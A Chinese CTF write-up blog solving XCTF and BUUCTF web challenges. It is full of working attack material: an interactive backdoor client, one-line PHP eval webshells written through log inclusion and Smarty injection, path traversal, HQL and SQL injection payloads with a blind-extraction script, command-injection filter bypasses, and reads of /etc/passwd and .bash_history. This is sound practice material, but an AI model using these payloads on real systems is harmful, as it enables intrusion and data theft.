acceptLangStr 即为要使用的 Accept-Language debugPrint(acceptLangStr) init2Char = acceptLang[0][0] + acceptLang[1][0] # $i md5head = (md5(init2Char + keyh).hexdigest())[0:3] # $h md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) # $f + 填充字符串 debugPrint(\u0026#39;$i is %s\u0026#39; % (init2Char)) debugPrint(\u0026#39;md5 head: %s\u0026#39; % (md5head,)) debugPrint(\u0026#39;md5 tail: %s\u0026#39; % (md5tail,)) # 交互式 Shell cmd = \u0026#34;system(\u0026#39;\u0026#34; + raw_input(\u0026#39;shell \u0026gt; \u0026#39;) + \u0026#34;\u0026#39;);\u0026#34; while cmd != \u0026#39;\u0026#39;: # 在写入 Payload 前填充一些无关数据 query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) # 生成无关数据并填充 debugPrint(\u0026#39;Before insert payload:\u0026#39;) debugPrint(query) debugPrint(urllib.urlencode(query)) # 对 Payload 进行加密 payload = zlib.compress(cmd) # gzcompress 操作 payload = loopXor(payload,xorKey) # 循环异或运算 , PHP代码中的 x() 函数 payload = base64.urlsafe_b64encode(payload) # base64_encode 编码 payload = md5head + payload # 在开头补全$h # 对Payload进行修改 cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 # 将 Payload 作为查询字符串编码拼接到 Referer 中 referer = url + \u0026#39;?\u0026#39; + urllib.urlencode(query) debugPrint(\u0026#39;After insert payload, referer is:\u0026#39;) debugPrint(query) debugPrint(referer) # 发送 HTTP GET 请求 r = sess.get(url,headers={\u0026#39;Accept-Language\u0026#39;:acceptLangStr,\u0026#39;Referer\u0026#39;:referer},proxies=proxies) html = r.text debugPrint(html) # 接收响应数据包 pattern = re.compile(r\u0026#39;\u0026lt;%s\u0026gt;(.*)\u0026lt;/%s\u0026gt;\u0026#39; % (xorKey,xorKey)) output = pattern.findall(html) # 如果没有收到响应数据包 if len(output) == 0: print \u0026#39;Error, no backdoor response\u0026#39; cmd = \u0026#34;system(\u0026#39;\u0026#34; + raw_input(\u0026#39;shell \u0026gt; \u0026#39;) + \u0026#34;\u0026#39;);\u0026#34; continue # 如果收到响应数据包 , 则对其进行处理 output = output[0] debugPrint(output) output = output.decode(\u0026#39;base64\u0026#39;) # base64_decode 解码 output = loopXor(output,xorKey) # 循环异或运算 output = zlib.decompress(output) # gzuncompress 运算 print output # 输出响应信息 cmd = \u0026#34;system(\u0026#39;\u0026#34; + raw_input(\u0026#39;shell \u0026gt; \u0026#39;) + \u0026#34;\u0026#39;);\u0026#34; 得到flag\n这里还有非预期解，var/log/nginx下有日志文件，而且前面file参数存在文件包含漏洞\n参考【文件包含漏洞】——文件包含漏洞进阶_日志文件包含利用_文件包含漏洞 apache日志-CSDN博客\n先在file参数后面加上\u0026lt;?php phpinfo();?\u0026gt;\u0026amp;ext=,然后以为浏览器会进行url转码，我们bp抓包改为没转码前的再放包\n接着在file后拼接log的路径..././..././..././..././/var/log/nginx/96ee3f7aa86e-access-2025-02-02.log\u0026amp;ext=\n接下来就是写入木马\n1 \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;);?\u0026gt; 同样的流程然后蚁剑连接\nZhuanxv 目录扫描扫到/list\n一个登入界面\n源码中body有一个url：./loadimage?fileName=web_login_bg.jpg\n我们访问看看，会下载bg.jpg\n通过网页插件我们知道这是java写的web界面\n那么我们尝试读取一下配置文件web.xml\n1 /loadimage?fileName=../../WEB-INF/web.xml 下载回来是图片，丢到vscode查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app id=\u0026#34;WebApp_9\u0026#34; version=\u0026#34;2.4\u0026#34; xmlns=\u0026#34;http://java.sun.com/xml/ns/j2ee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\u0026#34;\u0026gt; \u0026lt;display-name\u0026gt;Struts Blank\u0026lt;/display-name\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;struts2\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;struts2\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;welcome-file-list\u0026gt; \u0026lt;welcome-file\u0026gt;/ctfpage/index.jsp\u0026lt;/welcome-file\u0026gt; \u0026lt;/welcome-file-list\u0026gt; \u0026lt;error-page\u0026gt; \u0026lt;error-code\u0026gt;404\u0026lt;/error-code\u0026gt; \u0026lt;location\u0026gt;/ctfpage/404.html\u0026lt;/location\u0026gt; \u0026lt;/error-page\u0026gt; \u0026lt;/web-app\u0026gt; 可以看到，系统使用了struts2框架。\nstruts.xml是struts2的核心配置文件，在开发过程中利用率最高。该文件主要负责管理应用中的Action映射，以及该Action包含的Result定义等。\n下面我们读取struts.xml看看\n1 /loadimage?fileName=../../WEB-INF/classes/struts.xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE struts PUBLIC \u0026#34;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\u0026#34; \u0026#34;http://struts.apache.org/dtds/struts-2.3.dtd\u0026#34;\u0026gt; \u0026lt;struts\u0026gt; \u0026lt;constant name=\u0026#34;strutsenableDynamicMethodInvocation\u0026#34; value=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;constant name=\u0026#34;struts.mapper.alwaysSelectFullNamespace\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;constant name=\u0026#34;struts.action.extension\u0026#34; value=\u0026#34;,\u0026#34;/\u0026gt; \u0026lt;package name=\u0026#34;front\u0026#34; namespace=\u0026#34;/\u0026#34; extends=\u0026#34;struts-default\u0026#34;\u0026gt; \u0026lt;global-exception-mappings\u0026gt; \u0026lt;exception-mapping exception=\u0026#34;java.lang.Exception\u0026#34; result=\u0026#34;error\u0026#34;/\u0026gt; \u0026lt;/global-exception-mappings\u0026gt; \u0026lt;action name=\u0026#34;zhuanxvlogin\u0026#34; class=\u0026#34;com.cuitctf.action.UserLoginAction\u0026#34; method=\u0026#34;execute\u0026#34;\u0026gt; \u0026lt;result name=\u0026#34;error\u0026#34;\u0026gt;/ctfpage/login.jsp\u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;success\u0026#34;\u0026gt;/ctfpage/welcome.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;action name=\u0026#34;loadimage\u0026#34; class=\u0026#34;com.cuitctf.action.DownloadAction\u0026#34;\u0026gt; \u0026lt;result name=\u0026#34;success\u0026#34; type=\u0026#34;stream\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;contentType\u0026#34;\u0026gt;image/jpeg\u0026lt;/param\u0026gt; \u0026lt;param name=\u0026#34;contentDisposition\u0026#34;\u0026gt;attachment;filename=\u0026#34;bg.jpg\u0026#34;\u0026lt;/param\u0026gt; \u0026lt;param name=\u0026#34;inputName\u0026#34;\u0026gt;downloadFile\u0026lt;/param\u0026gt; \u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;suffix_error\u0026#34;\u0026gt;/ctfpage/welcome.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;/package\u0026gt; \u0026lt;package name=\u0026#34;back\u0026#34; namespace=\u0026#34;/\u0026#34; extends=\u0026#34;struts-default\u0026#34;\u0026gt; \u0026lt;interceptors\u0026gt; \u0026lt;interceptor name=\u0026#34;oa\u0026#34; class=\u0026#34;com.cuitctf.util.UserOAuth\u0026#34;/\u0026gt; \u0026lt;interceptor-stack name=\u0026#34;userAuth\u0026#34;\u0026gt; \u0026lt;interceptor-ref name=\u0026#34;defaultStack\u0026#34; /\u0026gt; \u0026lt;interceptor-ref name=\u0026#34;oa\u0026#34; /\u0026gt; \u0026lt;/interceptor-stack\u0026gt; \u0026lt;/interceptors\u0026gt; \u0026lt;action name=\u0026#34;list\u0026#34; class=\u0026#34;com.cuitctf.action.AdminAction\u0026#34; method=\u0026#34;execute\u0026#34;\u0026gt; \u0026lt;interceptor-ref name=\u0026#34;userAuth\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;excludeMethods\u0026#34;\u0026gt; execute \u0026lt;/param\u0026gt; \u0026lt;/interceptor-ref\u0026gt; \u0026lt;result name=\u0026#34;login_error\u0026#34;\u0026gt;/ctfpage/login.jsp\u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;list_error\u0026#34;\u0026gt;/ctfpage/welcome.jsp\u0026lt;/result\u0026gt; \u0026lt;result name=\u0026#34;success\u0026#34;\u0026gt;/ctfpage/welcome.jsp\u0026lt;/result\u0026gt; \u0026lt;/action\u0026gt; \u0026lt;/package\u0026gt; \u0026lt;/struts\u0026gt; 这里class里面可以看到很多class类名，尝试了一下，都可以逐个下载，点号换成正斜杠，然后再在后面加个.class就可以下载了\n1 2 3 4 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class 由于下载下来的class文件无法正常阅读，我们需要将其反编译成java源代码。\n打开jd-gui工具，将class文件直接拖进去即可。\nUserLoginAction.class这里引用了其他三个类，我们下载来看看\n1 2 3 loadimage?fileName=../../WEB-INF/classes/com/cuitctf/po/User.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/UserService.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext.class 找到一个xml，下载\n1 loadimage?fileName=../../WEB-INF/classes/applicationContext.xml 这里发现user.hbm.xml和两个类\n继续下载\n1 2 3 loadimage?fileName=../../WEB-INF/classes/user.hbm.xml loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class 这里过滤了用户名的空格和等号\n这里有HQL查询语句\n构造万能密码\n1 from User where name =\u0026#39;admin\u0026#39; or \u0026#39;1\u0026#39;\u0026gt;\u0026#39;0\u0026#39; or name like \u0026#39;admin\u0026#39; and password = \u0026#39;\u0026#34; + password + \u0026#34;\u0026#39; 因为上面过滤空格，我们用%09或者%0A代替\n1 2 用户名：admin\u0026#39;%0Aor%0A\u0026#39;1\u0026#39;\u0026gt;\u0026#39;0\u0026#39;%0Aor%0Aname%0Alike%0A\u0026#39;admin 密码：123（随意） 用hackbarget传参\n因为抓包的参数是这样\n所以我们\n1 ?user.name=admin\u0026#39;%0Aor%0A\u0026#39;1\u0026#39;\u0026gt;\u0026#39;0\u0026#39;%0Aor%0Aname%0Alike%0A\u0026#39;admin\u0026amp;user.password=1 登入成功，但是找不到flag\n想到前下user.hbm.xml没用到\nflag就在数据库中，\n这里用大佬们的盲注脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests s=requests.session() flag=\u0026#39;\u0026#39; for i in range(1,50): p=\u0026#39;\u0026#39; for j in range(1,255): payload = \u0026#34;(select%0Aascii(substr(id,\u0026#34;+str(i)+\u0026#34;,1))%0Afrom%0AFlag%0Awhere%0Aid\u0026lt;2)\u0026lt;\u0026#39;\u0026#34;+str(j)+\u0026#34;\u0026#39;\u0026#34; #print payload url=\u0026#34;http://61.147.171.105:53636/zhuanxvlogin?user.name=admin\u0026#39;%0Aor%0A\u0026#34;+payload+\u0026#34;%0Aor%0Aname%0Alike%0A\u0026#39;admin\u0026amp;user.password=1\u0026#34; r1=s.get(url) #print url #print len(r1.text) if len(r1.text)\u0026gt;20000 and p!=\u0026#39;\u0026#39;: flag+=p print (i,flag) break p=chr(j) 将payload中的where id\u0026lt;2删除后再爆破，发现也能成功。猜想Flag表中应该只有一个id列\nfilemanager 目录扫描\n扫到一个压缩包\n虚拟机中解压缩\n检查好几个php文件没有方向\n发现rename.php里面要求新文件和旧文件的拓展名要相同，我们没办法改后缀名\n但是我们可以通过二次注入，来使得其中老文件的拓展名为空，这样就可以修改拓展名为php\n这段oldname是查询数据库中的filename，所以我们可以传入',extension='随便符合条件的后缀名\n然后这样数据库查询oldname的时候就会有二次注入\n1 update `file` set `filename`=\u0026#39;shell.txt\u0026#39;, `oldname`=\u0026#39;\u0026#39;,extension=\u0026#39;\u0026#39; where `fid`={$result[\u0026#39;fid\u0026#39;]} 这样就是新文件名为shell.txt然后后缀名为空\n这里的file_exists要求数据库中的oldname存在，由于我们把shell.txt的后缀名改为空了\n我们要再上传一个同样名字的文件，才能修改后缀名来getshell\n这里虽然显示shell.txt.txt实际上没后缀名，上传一个包含木马的shell.txt，修改后缀名\n蚁剑连接\ncomment 发帖提交要求登入\n爆破密码\n爆出来666登入\n目录扫描出来很多git，怀疑是git泄露\n用githacker下载下来的源码不全\n1 githacker --url http://61.147.171.105:57107/.git --output-folder ./result 接下来修复\n1 git log --reflog 选择第一个恢复\n1 git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 查看源码确实恢复了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php include \u0026#34;mysql.php\u0026#34;; session_start(); if($_SESSION[\u0026#39;login\u0026#39;] != \u0026#39;yes\u0026#39;){ header(\u0026#34;Location: ./login.php\u0026#34;); die(); } if(isset($_GET[\u0026#39;do\u0026#39;])){ switch ($_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;write\u0026#39;: $category = addslashes($_POST[\u0026#39;category\u0026#39;]); $title = addslashes($_POST[\u0026#39;title\u0026#39;]); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into board set category = \u0026#39;$category\u0026#39;, title = \u0026#39;$title\u0026#39;, content = \u0026#39;$content\u0026#39;\u0026#34;; $result = mysql_query($sql); header(\u0026#34;Location: ./index.php\u0026#34;); break; case \u0026#39;comment\u0026#39;: $bo_id = addslashes($_POST[\u0026#39;bo_id\u0026#39;]); $sql = \u0026#34;select category from board where id=\u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u0026gt;0){ $category = mysql_fetch_array($result)[\u0026#39;category\u0026#39;]; $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); } header(\u0026#34;Location: ./comment.php?id=$bo_id\u0026#34;); break; default: header(\u0026#34;Location: ./index.php\u0026#34;); } } else{ header(\u0026#34;Location: ./index.php\u0026#34;); } ?\u0026gt; 1 2 3 4 5 $sql = \u0026#34;insert into comment set category = \u0026#39;$category\u0026#39;, content = \u0026#39;$content\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; $result = mysql_query($sql); 当登录后要发帖子时候，我们执行的sql语句是这段，但是我们可与看到每一段sql都是用另起一行，且可与看到category 并没有被过滤，而且页面上的帖子，content是可以被回显出来的\n#只能注释同一行，而这里需要注释/**/来进行两行的注释\n1 2 3 4 $sql = \u0026#34;insert into comment set category = \u0026#39;123\u0026#39;,content=user(),/*\u0026#39;, content = \u0026#39;*/#\u0026#39;, bo_id = \u0026#39;$bo_id\u0026#39;\u0026#34;; 那么我们第一段为1',content=database(),/*第二段为*/#就能查询数据库名\n回显ctf\n接下来看表名1',content=(select(group_concat(schema_name))from(information_schema.schemata)),/*\n接下来就是列名\n1',content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*\n无论哪个字段都没flag\n接着构造payload：1',content=(select( load_file('/etc/passwd'))),/*\n或者1',content=((select(load_file(\u0026quot;/etc/passwd\u0026quot;)))),/*\n最后www用户访问bin/bash目录，www用户使用了bash操作\n读取history历史记录\n1 1\u0026#39;,content=((select(load_file(\u0026#34;/home/www/.bash_history\u0026#34;)))),/* 1 2 3 4 5 6 7 cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 这里可以看出tmp/目录下有未删除的.DS_Store,然后/var/www/html/有除了.DS_Store的其他文件\n查看.DS_Store，用16进制查看\n1 1\u0026#39;,content=((select(hex(load_file(\u0026#34;/tmp/html/.DS_Store\u0026#34;))))),/* 可以看到flag为flag_8946e1ff1ee3e40f.php\n去/var/www/html/查看\n1 1\u0026#39;,content=((select(hex(load_file(\u0026#34;/var/www/html/flag_8946e1ff1ee3e40f.php\u0026#34;))))),/* upload 上来登入界面不存在注入\n登入完是文件上传\n试着传php和txt都错了\n猜测只能传图片\nbp抓包改后缀名，上传成功但是没显示路径名，但是回显文件名\n猜测是文件名注入，fuzz测试\nselect,from被过滤了\n而且是被删除的，双写绕过\n接着就是sql注入\npayload\n1 2 3 4 5 6 7 8 \u0026#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+\u0026#39;.jpg hex(xxx)　把取到的数据进行十六进制加密，防止过滤字符，不给回显； substr(xxx,1,12)　把取到的数据，截取一部分拿出来，先拿12个，防止长度限制不给回显；后面每次拿12个；如 13,12　25,12 selecselectt = select 查询语句 conv(xxx,16,10) 把 十六进制 转换为 十进制 //为什么，它过滤回显 ，十六进制内若存在字符 ，那么字符之后的数据就被干掉了； 出现10进制回显，先转回16进制，再转ascii码\nweb_up\n说明可行，我们继续注入\n1 \u0026#39;+(selecselectt conv(substr(hex(database()),13,12),16,10))+\u0026#39; load\n数据库名是web_upload\n接着爆表名\n1 2 3 \u0026#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = \u0026#39;web_upload\u0026#39; limit 1,1)),1,12),16,10))+\u0026#39;.jpg \u0026#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = \u0026#39;web_upload\u0026#39; limit 1,1)),13,12),16,10))+\u0026#39;.jpg \u0026#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = \u0026#39;web_upload\u0026#39; limit 1,1)),25,12),16,10))+\u0026#39;.jpg hello_flag_is_here\n接着爆列名\n1 2 \u0026#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=\u0026#39;hello_flag_is_here\u0026#39; limit 0,1)),1,12),16,10))+\u0026#39; \u0026#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=\u0026#39;hello_flag_is_here\u0026#39; limit 0,1)),13,12),16,10))+\u0026#39; i_am_flag\n爆字段\n1 2 3 \u0026#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+\u0026#39; \u0026#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+\u0026#39; \u0026#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+\u0026#39; !!_@m_Th.e_F!lag\nsmarty 看到题目就知道是smarty注入\n可以看看xff头\n使用{if}标签写入一句话木马\n1 {if file_put_contents(\u0026#39;/var/www/html/shell.php\u0026#39;,\u0026#39;\u0026lt;?php eval($_POST[cmd]);\u0026#39;)}{/if} 蚁剑连接\n直接url后接shell.php就行\n这里不让访问上层目录，不让任意命令执行，phpinfo发现禁用很多函数\n看师傅们都是用的无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户\n我们用蚁剑插件解决\n右键前下连接成功的网站，加载插件\n然后选上面这个模式\nics-02 ","date":"2025-01-11T00:00:00Z","image":"https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/1.jpg","permalink":"https://0d000721999.github.io/p/xctf%E5%88%B7%E9%A2%98/","title":"xctf刷题"},{"content":"buuctf 1、[极客大挑战 2019]EasySQL 进去猜闭合方式\n单引号闭合\n尝试万能密码登入\n1 2 username=1\u0026#39; or true# password=1\u0026#39; or true# 2、[极客大挑战 2019]Havefun 查看源码要get传cat的值为dog\n1 ?cat=dog 3、[HCTF 2018]WarmUp 查看源码source.php\n白名单只有source.php和hint.php,文件包含传file参数,且有?截断\n查看hint.php\n1 http://347210bf-0468-4578-89c6-04af275f9312.node5.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg 往上跳目录查找\n4、[ACTF2020 新生赛]Include 题目提示了文件包含，要查看flag.php文件\n用到php伪协议封装\n1 php://filter/read=convert.base64-encode/resource=xxx.php 这题直接\n1 /?file=php://filter/read=convert.base64-encode/resource=flag.php 然后base64解码\n就得到flag\n5、[ACTF2020 新生赛]Exec 简单的rce\n1 2 ip;ls / ip;cd /;cat /flag 6、[GXYCTF2019]Ping Ping Ping 尝试了好久感觉flag名字被过滤了，还有空格过滤\n先查看index.php\n1 http://41313055-4ac6-4251-8b42-bee9bd416efc.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9index.php 方法一：变量拼接字符串——将a的值覆盖，然后进行绕过 1 /?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php 然后查看源码得到flag\n方法二：内联执行 内联函数：将指定的函数体插入并取代每一处调用该函数的地方。\n反引号在linux中作为内联执行，执行输出结果。也就是说\n1 cat `ls` //执行ls输出 index.php 和 flag.php 。然后再执行 cat flag.php;cat index.php 1 /?ip=127.0.0.1;cat$IFS$9`ls` 方法三：sh命令来执行 加密命令 echo “cat flag.php” | base64 解密命令并执行 echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh\n1 /?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh 7、[SUCTF 2019]EasySQL 尝试很多闭合方式都回显nonono\n尝试堆叠注入\n1 2 1;show databases; 1;show tables; 可以看到flag应该在Flag表中\n输入非0数字\u0026ndash;有会显，输入0或字母\u0026ndash;没有回显\n由此可以猜测后端代码含有||或or运算符\n1 2 3 4 5 6 7 select command1 || command2 情况一：若command1为非0数字，则结果为1。 情况二：若command1为0或字母，command2为非0数字，则结果为1。 情况三：command1和command2都不为非0数字，则结果为0。 方法一：使用 sql_mode 中的 PIPES_AS_CONCAT 函数 PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。\nselect 1 || flag from Flag的意思将变成 先查询1 再查询 flag，而不是查询1flag,只是查询的结果会拼接到一起\n1 1;sql_mode=PIPES_AS_CONCAT;select 1 方法二：利用非预期漏洞获取flag 若输入1，1。那么sql语句就变成了 select 1, 1 || flag from Flag。其中由 [1] 和 [1 || flag] 两部分组成，而非 [1,1] || [flag]。非预期漏洞是利用数据库对符号判断的不准确形成的漏洞。\n1 *,1 输入 *，1 后，sql语句就变成了 select * , 1 || flag from Flag。\n其中分为两部分： (1) select * from Flag(2) select 1 || flag from Flag。\n8、[极客大挑战 2019]LoveSQL 单引号闭合\n尝试联合注入\n1 -1\u0026#39; union select 1,database(),version()# 爆出数据库名是geek\n1 2 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;l0ve1ysq1\u0026#39;# 1 2 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from l0ve1ysq1)# 然后查看源码就得到flag\n9、[强网杯 2019]随便注 闭合方式为单引号\n后面联合查询回显了过滤的字符\n用堆叠注入\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 出来两个表\n1 2 1\u0026#39;; show columns from words;# 1\u0026#39;; show columns from `1919810931114514`;# 这边注意数字要用`反引号包起来\n数字表中有flag\npayload\n1 2 3 4 5 6 7 8 9 1\u0026#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);# 1，通过 rename 先把 words 表改名为其他的表名。 2，把 1919810931114514 表的名字改为 words 。 3 ，给新 words 表添加新的列名 id 。 4，将 flag 改名为 data 。 或者\n1 2 3 4 1’;rename tables words to words1;rename tables 1919810931114514 to words; alter table words change flag id varchar(100);# 将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id 然后用1’ or 1=1 #得到flag 解法二\n因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码\n1 2 3 4 5 6 7 8 9 10 11 12 payload 先把0xselect * from `1919810931114514` 16进制编码 1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值，如下： 复制代码 代码如下: SELECT @VAR1=‘Y’,@VAR2=‘N’ – 而SET要达到同样的效果，需要： SET @VAR1=‘Y’ SET @VAR2=‘N’ prepare…from…是预处理语句，会进行编码转换。 execute用来执行由SQLPrepare创建的SQL语句 解法三\n用handler命令查看，\n1 2 3 4 5 1\u0026#39;; handler 1919810931114514 open as a;handler a read next;# handler代替select，以一行一行显示内容 open打开表 as更改表的别名为a read next读取数据文件内的数据次数 10、[极客大挑战 2019]Secret File 查看源码，发现其他php文件\nend.php前面的文件抓包\n发现secr3t.php\n访问flag.php\n用前面Include的方法php伪协议\n1 /secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 11、[极客大挑战 2019]Http 查看源码发现Secret.php\nIt doesn’t come from ‘https://www.Sycsecret.com’，也就是说这个页面得来自https://www.Sycsecret.com，添加referer即可\n添加User-Agent:Syclover\n添加X-Forwarded-For:127.0.0.1\n12、[极客大挑战 2019]Upload 要求上传图片，我们把文件类型改为image/jpeg\n下面补上GIF89a\n上传的内容被识别出\u0026lt;?要改为\n1 \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;@eval($_POST[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; 然后尝试等价后缀名，最后phtml上传成功，进upload目录，蚁剑连接\n13、[极客大挑战 2019]Knife 蚁剑连接\n14、[ACTF2020 新生赛]Upload 前端验证把onsubmit删掉，后面跟12题一样\n15、[极客大挑战 2019]BabySQL 单引号闭合，然后很多被过滤了，都用双写绕过,check.php后拼接\n1 username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23\u0026amp;password=1 16、[极客大挑战 2019]PHP www.zip下载源码\n反序列化\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Name{ private $username = \u0026#39;admin\u0026#39;; private $password = \u0026#39;100\u0026#39;; } $select = new Name(); echo serialize($select); 把结果的奇怪符号用%00代替，%00是空格的url编码\n17、[ACTF2020 新生赛]BackupFile php弱比较key=123\n18、[RoarCTF 2019]Easy Calc 源码里面查看calc.php\nnum传参只能传数字，但是我们用+num或者空格num就能传字符，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。\n过滤/，我们用chr(47)绕过，phpinfo();看到禁用system,用var_dump(scandir(/))\n看到flag是f1agg\n1 +num=1;var_dump(file_get_contents(chr(47).f1agg)) 19、[极客大挑战 2019]BuyFlag 密码弱比较，money用1e9或者money[]=1数组绕过，cookie里面user改为1\n20、BJDCTF2020]Easy MD5 打开网络，看到hint\n1 select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) 要在password这里拼接一个or 1就可以使结果为真\nmd5加密后得到hash值，sql语句会把hex值转为ascii\nffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6\n拼接后结果也为真\n计算脚本\n1 2 3 4 5 6 7 8 \u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; md5函数 md5 函数通常用于计算输入字符串的 MD5 哈希值。md5(string, raw) 这种形式的函数调用中，string 是需要进行哈希计算的输入字符串，而 raw 是一个布尔类型的参数，用于指定返回的哈希值的格式。\nstring：这是必需的参数，代表要进行 MD5 